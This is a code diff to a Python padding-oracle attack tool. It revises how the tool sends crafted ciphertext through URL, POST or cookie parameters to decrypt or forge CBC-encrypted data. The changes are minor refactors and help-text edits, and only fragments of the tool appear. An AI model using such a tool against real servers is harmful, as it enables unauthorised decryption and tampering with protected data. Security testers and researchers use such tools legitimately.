@@ -23,10 +23,10 @@ class Yapoet:
 
     def _is_valid_padding(self, encrypted_data):
         specify = lambda s: s.replace("%encrypted_data%",
-                                      urllib.parse.quote(self._encode_func(encrypted_data))) if s else ''
+                                      urllib.parse.quote(self._encode_func(encrypted_data)))
         url = specify(self._url)
-        post_data = specify(self._post_data).encode()
-        cookie = {"Cookie": specify(self._cookie)}
+        post_data = specify(self._post_data).encode() if self._post_data else None
+        cookie = {"Cookie": specify(self._cookie)} if self._cookie else {}
         try:
             self._requests_count += 1
             urllib.request.urlopen(urllib.request.Request(url, post_data, cookie))
@@ -77,7 +77,7 @@ class Yapoet:
             if decrypted_block == None:
                 return None
             for idx, val in enumerate(decrypted_block):
-                decrypted_data = chr(val ^ prev_block[idx] if self._mode == "CBC" else val) + decrypted_data
+                decrypted_data = chr(val ^ prev_block[idx]) + decrypted_data
             block_index -= self._block_size
         return str(decrypted_data[::-1].rstrip(decrypted_data[0])), self._requests_count
 
@@ -122,7 +122,7 @@ if __name__ == "__main__":
     parser.add_option("-e", "--encrypt", dest="plaintext_data", help="Plaintext data to encrypt (CBC mode only)")
     parser.add_option("--data", dest="post_data", help="POST data (e.g. \"param1=value%2b1&param2=value%2b1\")")
     parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
-    parser.add_option("--block-size", dest="block_size", help="Cipher block size [default: %default]")
+    parser.add_option("--block-size", dest="block_size", help="Cipher block size in bytes [default: %default]")
     parser.add_option("--iv", dest="iv",
                       help="Initialization vector (e.g. \"0x00,0x01,0x39...\") [default: 0x00 * BLOCK_SIZE]")
     parser.add_option("--mode", dest="mode", help="Mode of operation (\"CBC\") [default: %default]")
@@ -172,6 +172,5 @@ if __name__ == "__main__":
                 print("\n\n\Data were not encrypted: unexploitable or missing oracle")
     else:
         parser.print_help()
-        print("\nPlease note that the value of at least one of the HTTP-request parameters in\n"
-              "the URL, POST_DATA or COOKIE options should be replaced with an\n"
-              "%encrypted_data% placeholder.")
+        print("\nPlease note that the position of attacking data in URL, POST_DATA or COOKIE"
+              "\noptions should be picked by the %encrypted_data% placeholder")
